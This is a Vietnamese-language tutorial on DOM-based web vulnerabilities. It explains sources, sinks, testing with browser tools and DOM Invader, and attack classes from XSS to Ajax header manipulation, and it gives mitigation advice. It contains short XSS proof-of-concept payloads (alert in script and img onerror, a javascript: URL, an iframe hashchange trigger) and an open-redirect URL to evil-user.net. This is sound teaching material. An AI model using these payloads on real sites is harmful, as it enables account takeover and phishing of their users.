<!-- TOC -->
## Mục lục

- [DOM là gì?](#dom-là-gì)
- [Taint flow](#taint-flow)
  - [Taint flow là gì?](#taint-flow-là-gì)
    - [Source](#source)
    - [Sink](#sink)
    - [Source dễ bị tấn công](#source-dễ-bị-tấn-công)
    - [Sink dễ bị tấn công](#sink-dễ-bị-tấn-công)
  - [Bảo mật](#bảo-mật)
- [DOM-Based XSS](#dom-based-xss)
  - [Kiểm thử](#kiểm-thử)
    - [HTML sinks](#html-sinks)
    - [**JavaScript execution sinks**](#javascript-execution-sinks)
    - [DOM Invader](#dom-invader)
  - [Xâm nhập](#xâm-nhập)
    - [**Different sources and sinks**](#different-sources-and-sinks)
    - [**Sources and sinks in third-party dependencies**](#sources-and-sinks-in-third-party-dependencies)
    - [jQuery](#jquery)
    - [AngularJs](#angularjs)
    - [**Reflected and stored data**](#reflected-and-stored-data)
  - [Sink kém bảo mật](#sink-kém-bảo-mật)
- [**DOM-based open redirection**](#dom-based-open-redirection)
- [**DOM-based cookie manipulation**](#dom-based-cookie-manipulation)
- [**DOM-based JavaScript injection**](#dom-based-javascript-injection)
- [**DOM-based document-domain manipulation**](#dom-based-document-domain-manipulation)
- [**DOM-based WebSocket-URL poisoning**](#dom-based-websocket-url-poisoning)
- [**DOM-based link manipulation**](#dom-based-link-manipulation)
- [**DOM-based web message manipulation**](#dom-based-web-message-manipulation)
- [**DOM-based Ajax request-header manipulation**](#dom-based-ajax-request-header-manipulation)
- [**DOM-based local file-path manipulation**](#dom-based-local-file-path-manipulation)
- [**DOM-based client-side SQL injection**](#dom-based-client-side-sql-injection)
- [**DOM-based HTML5-storage manipulation**](#dom-based-html5-storage-manipulation)
- [**DOM-based client-side XPath injection**](#dom-based-client-side-xpath-injection)
- [**DOM-based client-side JSON injection**](#dom-based-client-side-json-injection)
- [**DOM-data manipulation**](#dom-data-manipulation)
- [**DOM-based denial of service**](#dom-based-denial-of-service)
- [**DOM-based web message**](#dom-based-web-message)
- [**DOM clobbering**](#dom-clobbering)
- [Bảo mật](#bảo-mật-1)
- [WU](#wu)
  - [DOM-based open redirection](#dom-based-open-redirection-1)
  - [DOM-based cookie manipulation](#dom-based-cookie-manipulation-1)
  - [DOM-based XSS web message](#dom-based-xss-web-message)
  - [DOM XSS using web messages and a JavaScript URL](#dom-xss-using-web-messages-and-a-javascript-url)
  - [DOM XSS using web messages and `JSON.parse`](#dom-xss-using-web-messages-and jsonparse)
  - [Exploiting DOM clobbering to enable XSS](#exploiting-dom-clobbering-to-enable-xss)
  - [Clobbering DOM attributes to bypass HTML filters](#clobbering-dom-attributes-to-bypass-html-filters)
<!-- /TOC -->
# DOM là gì?

Mô hình Đối tượng Tài liệu (Document Object Model – DOM) là một biểu diễn phân cấp của trình duyệt web về các phần tử trên trang. Các website có thể sử dụng JavaScript để thao tác với các node và object trong DOM, cũng như các thuộc tính của chúng. Việc thao tác DOM tự nó không phải là vấn đề – thực tế đây là một phần không thể thiếu trong cách các website hiện đại hoạt động.

Tuy nhiên, JavaScript xử lý dữ liệu không an toàn có thể tạo điều kiện cho nhiều kiểu tấn công. Lỗ hổng dựa trên DOM xuất hiện khi một website chứa JavaScript nhận một giá trị có thể bị kẻ tấn công kiểm soát (gọi là **source**) và truyền nó vào một hàm nguy hiểm (gọi là **sink**).
# Taint flow
Nhiều lỗ hổng dựa trên DOM có thể được truy ngược lại nguồn gốc từ các vấn đề trong cách mà mã phía client thao tác với dữ liệu có thể bị kẻ tấn công kiểm soát.
## Taint flow là gì?

Để có thể khai thác hoặc giảm thiểu những lỗ hổng này, điều quan trọng trước tiên là phải nắm vững những kiến thức cơ bản về **dòng dữ liệu ô nhiễm (taint flow)** giữa **source** và **sink**.
### Source

**Source** là một thuộc tính JavaScript nhận dữ liệu có khả năng bị kẻ tấn công kiểm soát.

Ví dụ về một **source** là thuộc tính **`location.search`**, vì nó đọc dữ liệu từ query string, vốn tương đối dễ bị kẻ tấn công điều khiển.

Về cơ bản, bất kỳ thuộc tính nào có thể bị kẻ tấn công kiểm soát đều là một **source** tiềm ẩn. Điều này bao gồm:

- URL tham chiếu (**`document.referrer`**)
- Cookie của người dùng (**`document.cookie`**)
- Các thông điệp web (**web messages**)
### Sink

**Sink** là một hàm JavaScript hoặc đối tượng DOM có khả năng gây ra các hậu quả không mong muốn nếu dữ liệu do kẻ tấn công kiểm soát được truyền vào. Ví dụ, hàm `eval()` là một sink vì nó xử lý đối số truyền vào như mã JavaScript. Một ví dụ về sink ở mức HTML là `document.body.innerHTML`, vì nó có thể cho phép kẻ tấn công chèn HTML độc hại và thực thi JavaScript tùy ý.

Về bản chất, các lỗ hổng dựa trên DOM xuất hiện khi một website truyền dữ liệu từ một source tới một sink, và sink đó xử lý dữ liệu một cách không an toàn trong ngữ cảnh phiên làm việc của client.

Source phổ biến nhất là URL, thường được truy cập qua đối tượng `location`. Kẻ tấn công có thể tạo một liên kết để gửi nạn nhân tới trang dễ bị tổn thương với payload nằm trong phần query string hoặc fragment của URL. Xem xét đoạn mã sau:

```jsx
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

Đoạn mã này dễ bị lỗ hổng mở chuyển hướng (DOM-based open redirection) vì source `location.hash` được xử lý một cách không an toàn. Nếu URL chứa một hash fragment bắt đầu bằng `https:`, đoạn mã này sẽ lấy giá trị của `location.hash` và gán nó cho thuộc tính `location` của window. Kẻ tấn công có thể khai thác lỗ hổng này bằng cách tạo URL:

```
<https://www.innocent-website.com/example#https://www.evil-user.net>
```

Khi nạn nhân truy cập URL này, JavaScript sẽ gán giá trị `location` thành `https://www.evil-user.net`, điều này sẽ tự động chuyển hướng nạn nhân tới site độc hại. Hành vi này có thể dễ dàng bị lợi dụng để dựng các cuộc tấn công lừa đảo (phishing)
### Source dễ bị tấn công

Những nguồn điển hình sau đây có thể được sử dụng để khai thác nhiều loại lỗ hổng theo luồng dữ liệu ô nhiễm (taint-flow):

- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `location`
- `document.cookie`
- `document.referrer`
- `window.name`
- `history.pushState`
- `history.replaceState`
- `localStorage`
- `sessionStorage`
- IndexedDB (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)
- `Database`

### Sink dễ bị tấn công

Danh sách sau cung cấp tổng quan nhanh về các lỗ hổng dựa trên DOM thường gặp và một ví dụ về **sink** có thể dẫn đến mỗi loại.

|Lỗ hổng dựa trên DOM|Ví dụ về sink|
|---|---|
|DOM XSS LABS|`document.write()`|
|Open redirection LABS|`window.location`|
|Cookie manipulation LABS|`document.cookie`|
|JavaScript injection|`eval()`|
|Document-domain manipulation|`document.domain`|
|WebSocket-URL poisoning|`WebSocket()`|
|Link manipulation|`element.src`|
|Web message manipulation|`postMessage()`|
|Ajax request-header manipulation|`setRequestHeader()`|
|Local file-path manipulation|`FileReader.readAsText()`|
|Client-side SQL injection|`ExecuteSql()`|
|HTML5-storage manipulation|`sessionStorage.setItem()`|
|Client-side XPath injection|`document.evaluate()`|
|Client-side JSON injection|`JSON.parse()`|
|DOM-data manipulation|`element.setAttribute()`|
|Denial of service|`RegExp()`|

## Bảo mật

Không có một biện pháp duy nhất nào có thể loại bỏ hoàn toàn mối đe dọa từ các cuộc tấn công dựa trên DOM. Tuy nhiên, nhìn chung, cách hiệu quả nhất để tránh các lỗ hổng dựa trên DOM là **không cho phép dữ liệu từ bất kỳ nguồn không tin cậy nào thay đổi động giá trị được truyền tới bất kỳ sink nào**.

Nếu chức năng mong muốn của ứng dụng buộc phải có hành vi này, thì cần triển khai các cơ chế phòng vệ ngay trong mã phía client. Trong nhiều trường hợp, dữ liệu liên quan có thể được kiểm tra bằng **whitelist**, chỉ cho phép những nội dung được xác định là an toàn. Trong các trường hợp khác, cần phải **làm sạch (sanitize)** hoặc **mã hóa (encode)** dữ liệu. Đây có thể là một tác vụ phức tạp, và tùy vào ngữ cảnh dữ liệu được chèn vào, có thể phải kết hợp nhiều kỹ thuật:
- escaping trong JavaScript
- HTML encoding
- URL encoding
theo đúng thứ tự cần thiết.

# DOM-Based XSS

Lỗ hổng DOM-based XSS thường phát sinh khi JavaScript lấy dữ liệu từ **source** có thể bị kẻ tấn công kiểm soát, chẳng hạn như URL, và truyền nó tới một **sink** hỗ trợ thực thi mã động, như `eval()` hoặc `innerHTML`. Điều này cho phép kẻ tấn công thực thi JavaScript độc hại, thường cho phép chúng chiếm đoạt tài khoản người dùng khác.

Để thực hiện một cuộc tấn công DOM-based XSS, kẻ tấn công cần đặt dữ liệu vào một **source** sao cho dữ liệu đó được truyền tiếp tới một **sink** và gây ra việc thực thi mã JavaScript tùy ý.

Source phổ biến nhất cho DOM XSS là URL, thường được truy cập qua đối tượng `window.location`. Kẻ tấn công có thể tạo một liên kết để gửi nạn nhân tới trang dễ bị tổn thương với payload nằm trong query string hoặc phần fragment của URL. Trong một số trường hợp nhất định, chẳng hạn khi nhắm vào trang 404 hoặc một website chạy PHP, payload cũng có thể được đặt trong phần path của URL.

## Kiểm thử

Phần lớn lỗ hổng DOM XSS có thể được phát hiện nhanh và đáng tin cậy bằng công cụ quét lỗ hổng web của Burp Suite. Để kiểm tra DOM-based cross-site scripting thủ công, bạn thường cần sử dụng một trình duyệt kèm công cụ phát triển (developer tools), ví dụ Chrome. Bạn cần lần lượt duyệt qua từng **source** có thể có, và kiểm tra từng **source** một cách độc lập.
### HTML sinks

Để kiểm tra DOM XSS trong một HTML sink, hãy đặt một chuỗi ký tự ngẫu nhiên (ký tự chữ và số) vào source (ví dụ `location.search`), sau đó dùng công cụ phát triển (developer tools) của trình duyệt để kiểm tra HTML và tìm nơi chuỗi của bạn xuất hiện. Lưu ý rằng tùy chọn “View source” của trình duyệt sẽ không hiệu quả cho kiểm tra DOM XSS vì nó không phản ánh những thay đổi mà JavaScript thực hiện lên HTML. Trong developer tools của Chrome, bạn có thể dùng `Control+F` (hoặc `Command+F` trên macOS) để tìm chuỗi trong DOM.

Với mỗi vị trí mà chuỗi của bạn xuất hiện trong DOM, bạn cần xác định ngữ cảnh (context). Dựa trên ngữ cảnh này, hãy tinh chỉnh dữ liệu đầu vào để xem cách nó được xử lý. Ví dụ: nếu chuỗi xuất hiện trong một thuộc tính được bao bởi dấu ngoặc kép, hãy thử chèn dấu ngoặc kép vào chuỗi để xem có thể “thoát” khỏi thuộc tính đó hay không.

Lưu ý rằng các trình duyệt xử lý khác nhau về việc mã hóa URL: Chrome, Firefox và Safari sẽ URL-encode `location.search` và `location.hash`, trong khi IE11 và Microsoft Edge (phiên bản trước Chromium) thì không URL-encode các nguồn này. Nếu dữ liệu của bạn bị URL-encode trước khi được xử lý, thì một cuộc tấn công XSS có khả năng sẽ không thành công.

### **JavaScript execution sinks**

Kiểm tra các sink thực thi JavaScript cho DOM-based XSS khó hơn một chút. Với các sink này, dữ liệu đầu vào của bạn không nhất thiết xuất hiện ở bất kỳ đâu trong DOM, nên bạn không thể tìm bằng cách tìm kiếm chuỗi trong DOM. Thay vào đó, bạn sẽ cần sử dụng trình gỡ lỗi JavaScript (JavaScript debugger) để xác định xem dữ liệu của bạn có được gửi tới sink hay không và bằng cách nào.

Với mỗi source tiềm năng, chẳng hạn `location`, trước tiên bạn cần tìm các chỗ trong mã JavaScript của trang nơi source đó được tham chiếu. Trong developer tools của Chrome, bạn có thể dùng `Control+Shift+F` (hoặc `Command+Alt+F` trên macOS) để tìm kiếm toàn bộ mã JavaScript của trang cho source đó.

Khi bạn tìm thấy nơi source đang được đọc, hãy dùng trình gỡ lỗi JavaScript để đặt breakpoint và theo dõi cách giá trị của source được sử dụng. Bạn có thể thấy source được gán cho các biến khác. Nếu đúng như vậy, bạn cần dùng chức năng tìm kiếm một lần nữa để theo dõi những biến này và xem chúng có được truyền tới một sink hay không. Khi bạn tìm thấy một sink đang được gán dữ liệu có nguồn gốc từ source, bạn có thể dùng debugger để kiểm tra giá trị bằng cách di chuột lên biến để hiển thị giá trị trước khi nó được gửi tới sink. Sau đó, giống như với các HTML sink, bạn cần tinh chỉnh dữ liệu đầu vào để xem liệu có thể thực hiện một cuộc tấn công XSS thành công hay không.
### DOM Invader

Việc xác định và khai thác DOM XSS trong thực tế có thể là một quá trình tẻ nhạt, thường yêu cầu bạn phải dò thủ công qua các đoạn mã JavaScript phức tạp và đã được minify. Tuy nhiên, nếu bạn sử dụng trình duyệt của Burp, bạn có thể tận dụng tiện ích mở rộng **DOM Invader** tích hợp sẵn, công cụ này thực hiện phần lớn công việc nặng nhọc cho bạn.
## Xâm nhập

### **Different sources and sinks**

Về nguyên tắc, một website dễ bị DOM-based cross-site scripting nếu tồn tại một đường thực thi cho phép dữ liệu truyền từ **source** đến **sink**. Trong thực tế, các source và sink khác nhau có những đặc tính và hành vi khác nhau ảnh hưởng tới khả năng khai thác và quyết định kỹ thuật cần thiết. Thêm vào đó, các script của website có thể thực hiện việc xác thực hoặc xử lý dữ liệu mà bạn phải cân nhắc khi cố gắng khai thác lỗ hổng. Có nhiều sink liên quan tới các lỗ hổng dựa trên DOM — xin xem danh sách ở dưới để biết chi tiết.

Sink `document.write` hoạt động với các phần tử `script`, vì vậy bạn có thể dùng một payload đơn giản, ví dụ như:

```jsx
document.write('... <script>alert(document.domain)</script> ...');
```

> **Lưu ý** Trong một số tình huống, nội dung được ghi bởi `document.write` có thể bao gồm một số ngữ cảnh xung quanh mà bạn cần phải tính đến khi khai thác. Ví dụ, bạn có thể cần đóng một vài phần tử đã tồn tại trước đó trước khi chèn payload JavaScript của mình.

Sink `innerHTML` không chấp nhận phần tử `script` trên bất kỳ trình duyệt hiện đại nào, và sự kiện `onload` của `svg` cũng sẽ không được kích hoạt. Điều này có nghĩa là bạn sẽ cần sử dụng các phần tử thay thế như `img` hoặc `iframe`. Các trình xử lý sự kiện (event handlers) như `onload` và `onerror` có thể được sử dụng kết hợp với những phần tử này. Ví dụ:

```jsx
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```
### **Sources and sinks in third-party dependencies**

Các ứng dụng web hiện đại thường được xây dựng bằng một số thư viện và framework của bên thứ ba, vốn thường cung cấp thêm các chức năng và khả năng cho nhà phát triển. Cần ghi nhớ rằng một số trong những thư viện này cũng có thể là **source** và **sink** tiềm ẩn cho DOM XSS.

### jQuery

Nếu một thư viện JavaScript như jQuery đang được sử dụng, hãy chú ý tới các _sink_ có thể thay đổi các phần tử DOM trên trang. Ví dụ, hàm `attr()` của jQuery có thể thay đổi các thuộc tính của phần tử DOM. Nếu dữ liệu được đọc từ một _source_ do người dùng điều khiển như URL, rồi được truyền vào `attr()`, thì có thể khai thác để thao tác giá trị được gửi nhằm gây XSS. Ví dụ, ở đây có một đoạn JavaScript thay đổi thuộc tính `href` của một thẻ anchor bằng dữ liệu lấy từ URL:

```jsx
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Bạn có thể khai thác bằng cách chỉnh sửa URL sao cho `location.search` chứa một JavaScript URL độc hại. Sau khi JavaScript của trang gán URL độc hại này cho `href` của liên kết “back”, việc nhấp vào liên kết đó sẽ thực thi nó:

```
?returnUrl=javascript:alert(document.domain)
```

Một **sink** tiềm ẩn khác cần chú ý là hàm chọn của jQuery — `$()` — vốn có thể được dùng để chèn các đối tượng độc hại vào DOM.

jQuery từng rất phổ biến, và một lỗ hổng DOM XSS kinh điển xuất phát từ việc các website sử dụng selector này kết hợp với nguồn `location.hash` cho mục đích animation hoặc tự cuộn tới một phần tử trên trang. Hành vi này thường được triển khai bằng một bộ xử lý sự kiện `hashchange` dễ bị tổn thương, tương tự như sau:

```jsx
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

Vì `hash` có thể bị người dùng điều khiển, kẻ tấn công có thể lợi dụng để chèn vector XSS vào sink `$()` của selector. Các phiên bản jQuery mới hơn đã sửa lỗi cụ thể này bằng cách ngăn không cho chèn HTML vào selector khi input bắt đầu bằng ký tự `#`. Tuy nhiên, bạn vẫn có thể tìm thấy mã dễ bị tổn thương ngoài thực tế.

Để thực sự khai thác lỗ hổng kinh điển này, bạn cần tìm cách kích hoạt sự kiện `hashchange` mà không cần tương tác người dùng. Một trong những cách đơn giản nhất là truyền exploit của bạn qua một `iframe`:

```html
<iframe src="<https://vulnerable-website.com>#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

Trong ví dụ này, thuộc tính `src` trỏ tới trang dễ bị tổn thương với giá trị hash rỗng. Khi `iframe` được load, một vector XSS được thêm vào hash, làm sự kiện `hashchange` được kích hoạt.

> **Lưu ý**
> 
> Ngay cả các phiên bản jQuery mới hơn vẫn có thể bị ảnh hưởng thông qua sink `$()` nếu bạn có quyền kiểm soát hoàn toàn input của nó từ một source không yêu cầu tiền tố `#`.

### AngularJs

Nếu một framework như AngularJS được sử dụng, có thể thực thi JavaScript mà không cần dùng dấu ngoặc nhọn góc (`< >`) hoặc các event. Khi một trang sử dụng thuộc tính `ng-app` trên một phần tử HTML, phần tử đó sẽ được AngularJS xử lý. Trong trường hợp này, AngularJS sẽ thực thi JavaScript nằm trong cặp ngoặc nhọn đôi (`{{ ... }}`) — có thể xuất hiện trực tiếp trong HTML hoặc bên trong các thuộc tính.
### **Reflected and stored data**

Một số lỗ hổng dựa trên DOM thuần túy tự chứa trong một trang duy nhất. Nếu một script đọc dữ liệu từ URL và ghi nó vào một **sink** nguy hiểm, thì lỗ hổng đó hoàn toàn nằm ở phía client.

Tuy nhiên, **source** không chỉ giới hạn ở dữ liệu được trình duyệt phơi bày trực tiếp — chúng cũng có thể bắt nguồn từ chính website. Ví dụ, các website thường phản chiếu tham số URL trong phản hồi HTML từ server. Điều này thường liên quan tới XSS phản chiếu (reflected XSS) thông thường, nhưng cũng có thể dẫn tới lỗ hổng DOM XSS dạng phản chiếu.

Trong một lỗ hổng reflected DOM XSS, server xử lý dữ liệu từ request và phản chiếu dữ liệu đó vào phản hồi. Dữ liệu phản chiếu có thể được đặt vào một JavaScript string literal, hoặc một mục dữ liệu trong DOM, chẳng hạn một trường form. Một script trên trang sau đó xử lý dữ liệu phản chiếu đó một cách không an toàn, và cuối cùng ghi nó vào một **sink** nguy hiểm.

```jsx
eval('var data = "reflected string"');
```

Các website cũng có thể lưu trữ dữ liệu trên máy chủ và phản chiếu nó ở nơi khác. Trong lỗ hổng DOM XSS dạng lưu trữ (stored DOM XSS), máy chủ nhận dữ liệu từ một yêu cầu, lưu trữ nó, và sau đó đưa dữ liệu đó vào một phản hồi sau này. Một script trong phản hồi sau này chứa một **sink** và sau đó xử lý dữ liệu đó một cách không an toàn.

```jsx
element.innerHTML = comment.author
```

## Sink kém bảo mật


Dưới đây là một số **sink** chính có thể dẫn tới lỗ hổng DOM-XSS:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`

Các hàm của jQuery sau cũng là những sink có thể dẫn tới lỗ hổng DOM-XSS:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`

# **DOM-based open redirection**


Lỗ hổng **open-redirection** dựa trên DOM phát sinh khi một script ghi dữ liệu có thể bị kẻ tấn công điều khiển vào một **sink** có khả năng kích hoạt điều hướng sang miền khác. Ví dụ, đoạn mã sau dễ bị tổn thương do cách xử lý không an toàn thuộc tính `location.hash`:

```jsx
let url = /https?:\\/\\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người khác truy cập, sẽ gây ra việc chuyển hướng tới một miền bên ngoài tùy ý.

Hành vi này có thể bị lợi dụng để hỗ trợ các cuộc tấn công lừa đảo (phishing) nhắm vào người dùng của trang web, ví dụ như vậy. Khả năng sử dụng một URL ứng dụng hợp pháp nhắm tới miền đúng và có chứng chỉ TLS hợp lệ (nếu sử dụng TLS) làm tăng độ tin cậy cho cuộc tấn công phishing, vì nhiều người dùng, ngay cả khi họ kiểm tra những yếu tố này, sẽ không nhận ra việc chuyển hướng sau đó sang một miền khác.

Nếu kẻ tấn công có thể kiểm soát phần bắt đầu của chuỗi được truyền tới API chuyển hướng, thì có thể nâng mức lỗ hổng này thành tấn công chèn mã JavaScript. Kẻ tấn công có thể tạo một URL sử dụng pseudo-protocol `javascript:` để thực thi mã tùy ý khi URL đó được trình duyệt xử lý.

Dưới đây là một số **sink** chính có thể dẫn tới lỗ hổng open-redirection dựa trên DOM:

- `location`
- `location.host`
- `location.hostname`
- `location.href`
- `location.pathname`
- `location.search`
- `location.protocol`
- `location.assign()`
- `location.replace()`
- `open()`
- `element.srcdoc`
- `XMLHttpRequest.open()`
- `XMLHttpRequest.send()`
- `jQuery.ajax()`
- `$.ajax()`

# **DOM-based cookie manipulation**

Một số lỗ hổng dựa trên DOM cho phép kẻ tấn công thao túng dữ liệu mà họ thường không kiểm soát. Điều này biến những kiểu dữ liệu vốn an toàn, chẳng hạn cookie, thành các **source** tiềm ẩn. Lỗ hổng DOM-based manipulation cookie xuất hiện khi một script ghi dữ liệu có thể bị kẻ tấn công kiểm soát vào giá trị của một cookie.

Kẻ tấn công có thể tận dụng lỗ hổng này để tạo một URL sao cho, nếu người khác truy cập, sẽ thiết lập một giá trị tùy ý trong cookie của người dùng. Nhiều **sink** tự nó có thể ít gây hại, nhưng các cuộc tấn công thao túng cookie dựa trên DOM cho thấy cách các lỗ hổng có mức độ thấp đôi khi có thể được dùng như một mắt xích trong chuỗi khai thác dẫn tới tấn công mức nghiêm trọng. Ví dụ, nếu JavaScript ghi dữ liệu từ một **source** vào `document.cookie` mà không xử lý (sanitize) trước, kẻ tấn công có thể thao túng giá trị của một cookie để chèn các giá trị tùy ý:

```jsx
document.cookie = 'cookieName='+location.hash.slice(1);
```

Nếu website phản chiếu giá trị từ cookie một cách không an toàn mà không mã hóa HTML (HTML-encoding) trước khi hiển thị, kẻ tấn công có thể dùng kỹ thuật thao túng cookie để khai thác hành vi này.

Tác động tiềm tàng của lỗ hổng này phụ thuộc vào vai trò mà cookie đóng trong website. Nếu cookie được dùng để điều khiển hành vi phát sinh từ những hành động của người dùng (ví dụ: cấu hình chế độ production so với demo), thì kẻ tấn công có thể gây cho người dùng thực hiện các hành động ngoài ý muốn bằng cách thao túng giá trị của cookie.

Nếu cookie dùng để theo dõi phiên làm việc của người dùng, kẻ tấn công có thể thực hiện một **tấn công cố định phiên (session fixation)**, trong đó họ thiết lập giá trị cookie thành một token hợp lệ mà họ đã lấy được từ website, rồi chiếm đoạt phiên trong các tương tác tiếp theo của nạn nhân với website. Lỗ hổng thao túng cookie như vậy có thể được dùng để tấn công không chỉ trang web dễ bị tổn thương mà còn bất kỳ trang web nào khác nằm dưới **cùng miền gốc (parent domain)**.

Sink kém bảo mật
- `document.cookie`

# **DOM-based JavaScript injection**

Lỗ hổng **chèn JavaScript dựa trên DOM** xuất hiện khi một script thực thi dữ liệu có thể bị kẻ tấn công kiểm soát như mã JavaScript. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người khác truy cập, mã JavaScript do kẻ tấn công cung cấp sẽ được thực thi trong ngữ cảnh phiên trình duyệt của nạn nhân.

Người dùng có thể bị lừa truy cập URL độc hại của kẻ tấn công bằng nhiều cách, tương tự như các vector phân phối tấn công thông thường cho lỗ hổng XSS phản chiếu.

Mã do kẻ tấn công cung cấp có thể thực hiện nhiều hành động khác nhau, ví dụ: lấy cắp token phiên hoặc thông tin đăng nhập của nạn nhân, thực hiện các hành động tùy ý thay mặt nạn nhân, hoặc thậm chí ghi lại các phím gõ của họ.

Dưới đây là một số **sink** chính có thể dẫn tới lỗ hổng DOM-based JavaScript-injection:

- `eval()`
- `Function()`
- `setTimeout()`
- `setInterval()`
- `setImmediate()`
- `execCommand()`
- `execScript()`
- `msSetImmediate()`
- `range.createContextualFragment()`
- `crypto.generateCRMFRequest()`

# **DOM-based document-domain manipulation**

Lỗ hổng thao tác `document.domain` phát sinh khi một script sử dụng dữ liệu có thể bị kẻ tấn công điều khiển để gán cho thuộc tính `document.domain`. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người khác truy cập, trang phản hồi sẽ gán một giá trị `document.domain` tùy ý.

Thuộc tính `document.domain` được trình duyệt sử dụng trong việc thực thi chính sách cùng nguồn gốc (same origin policy). Nếu hai trang từ các origin khác nhau cùng thiết lập `document.domain` thành cùng một giá trị, thì hai trang đó có thể tương tác với nhau mà không bị hạn chế. Nếu kẻ tấn công có thể khiến một trang của website mục tiêu và một trang khác do họ kiểm soát (trực tiếp, hoặc thông qua một lỗ hổng giống XSS) cùng đặt `document.domain` về cùng một giá trị, thì kẻ tấn công có thể hoàn toàn xâm phạm trang mục tiêu thông qua trang họ đã kiểm soát. Điều này mở ra khả năng khai thác tương tự như các lỗ hổng cross-site scripting (XSS) thông thường.

Trình duyệt thường áp đặt một số hạn chế lên các giá trị có thể gán cho `document.domain`, và có thể ngăn chặn việc dùng các giá trị hoàn toàn khác với origin thực tế của trang. Tuy nhiên, có hai lưu ý quan trọng. Thứ nhất, trình duyệt cho phép sử dụng domain con hoặc domain cha, vì vậy kẻ tấn công có thể chuyển domain của trang mục tiêu sang một website liên quan có cơ chế bảo mật yếu hơn. Thứ hai, một số hành vi bất thường của trình duyệt cho phép chuyển sang các domain hoàn toàn không liên quan. Những lưu ý này có nghĩa là khả năng thao tác thuộc tính `document.domain` của một trang thường đại diện cho một lỗ hổng bảo mật có mức nghiêm trọng gần tương đương với XSS thông thường.

Sink kém bảo mật
- `document.domain`
# **DOM-based WebSocket-URL poisoning**

WebSocket-URL poisoning xảy ra khi một script sử dụng dữ liệu có thể bị điều khiển bởi kẻ tấn công làm URL đích của một kết nối WebSocket. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người dùng khác truy cập, trình duyệt của họ sẽ mở một kết nối WebSocket tới một URL do kẻ tấn công kiểm soát.

Tác động tiềm tàng phụ thuộc vào cách website sử dụng WebSocket. Nếu website truyền dữ liệu nhạy cảm từ trình duyệt của người dùng tới server WebSocket, thì kẻ tấn công có thể chặn được dữ liệu này.

Nếu ứng dụng đọc dữ liệu từ server WebSocket và xử lý nó theo một cách nào đó, kẻ tấn công có thể làm sai lệch logic của website hoặc phát động các tấn công phía client nhắm vào người dùng.

Sink kém bảo mật
- `WebSocket`
# **DOM-based link manipulation**

Lỗ hổng **thao tác liên kết (link-manipulation)** dựa trên DOM phát sinh khi một script ghi dữ liệu có thể bị kẻ tấn công điều khiển vào mục tiêu điều hướng trong trang hiện tại, chẳng hạn một liên kết có thể nhấp được hoặc URL gửi của một form. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu được người dùng khác của ứng dụng truy cập, sẽ làm thay đổi mục tiêu của các liên kết trong phản hồi.

Kẻ tấn công có thể lợi dụng lỗ hổng này để thực hiện nhiều kiểu tấn công, bao gồm:

- Gây chuyển hướng người dùng đến một URL bên ngoài tùy ý, điều này có thể hỗ trợ tấn công lừa đảo (phishing).
- Khiến người dùng gửi dữ liệu form nhạy cảm tới một server do kẻ tấn công kiểm soát.
- Thay đổi file hoặc query string liên kết, khiến người dùng thực hiện một hành động không mong muốn trong ứng dụng.
- Bypass các cơ chế chống XSS của trình duyệt bằng cách chèn các liên kết trên cùng site chứa mã XSS. Điều này hoạt động vì các cơ chế chống XSS thường không tính đến các liên kết nội bộ (on-site links).

Một số **sink** chính có thể dẫn tới lỗ hổng thao tác liên kết dựa trên DOM gồm:

- `element.href`
- `element.src`
- `element.action`

# **DOM-based web message manipulation**


Lỗ hổng thông điệp web (web message vulnerabilities) phát sinh khi một script gửi dữ liệu có thể bị kẻ tấn công điều khiển dưới dạng một **thông điệp web** tới một tài liệu (document) khác trong trình duyệt. Kẻ tấn công có thể tận dụng dữ liệu của thông điệp web làm **source** bằng cách tạo một trang web sao cho, nếu người dùng truy cập trang đó, trình duyệt của họ sẽ gửi một thông điệp web chứa dữ liệu do kẻ tấn công kiểm soát. Để biết thêm về cách sử dụng thông điệp web làm nguồn dữ liệu, hãy tham khảo trang **Kiểm soát nguồn thông điệp web**.

Sink kém bảo mật
- `postMessage`


# **DOM-based Ajax request-header manipulation**

Việc sử dụng Ajax cho phép một website thực hiện các yêu cầu bất đồng bộ tới server để ứng dụng web có thể thay đổi nội dung trên trang một cách động mà không cần tải lại toàn bộ trang. Tuy nhiên, lỗ hổng **thao tác header yêu cầu Ajax** dựa trên DOM xuất hiện khi một script ghi dữ liệu có thể bị kẻ tấn công điều khiển vào header của một yêu cầu Ajax được phát đi bằng đối tượng `XMLHttpRequest`. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người dùng khác truy cập, sẽ thiết lập một header tùy ý trong các yêu cầu Ajax tiếp theo. Điều này có thể được dùng làm điểm khởi đầu để xâu chuỗi các kiểu tấn công khác, từ đó làm tăng mức độ nghiêm trọng tiềm ẩn của lỗ hổng

Tác động tiềm tàng của lỗ hổng phụ thuộc vào vai trò của các header HTTP cụ thể trong việc xử lý phía server đối với yêu cầu Ajax. Nếu header được dùng để điều khiển hành vi phát sinh từ yêu cầu Ajax, kẻ tấn công có thể khiến người dùng thực hiện các hành động ngoài ý muốn bằng cách thao túng header. Mức độ tác động cũng phụ thuộc vào chính xác những gì kẻ tấn công có thể chèn vào header.

Sink kém bảo mật

- `XMLHttpRequest.setRequestHeader()`
